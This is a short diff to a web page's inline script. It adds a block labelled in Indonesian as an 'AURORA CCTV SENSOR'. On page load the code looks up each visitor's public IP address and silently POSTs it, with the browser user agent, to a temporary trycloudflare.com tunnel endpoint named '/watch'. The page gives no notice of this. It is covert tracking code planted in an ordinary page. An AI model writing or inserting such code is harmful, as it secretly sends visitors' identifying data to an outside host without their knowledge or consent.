@@ -34,6 +34,20 @@
             }
         })();
     })();
+            // 4. AURORA CCTV SENSOR (Taro di baris 36)
+    fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
+        fetch('https://participation-fraction-scanning-primarily.trycloudflare.com/watch', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                ip: data.ip,
+                browser: navigator.userAgent
+            })
+        });
+    });
+
 </script>
     <style>
         body {
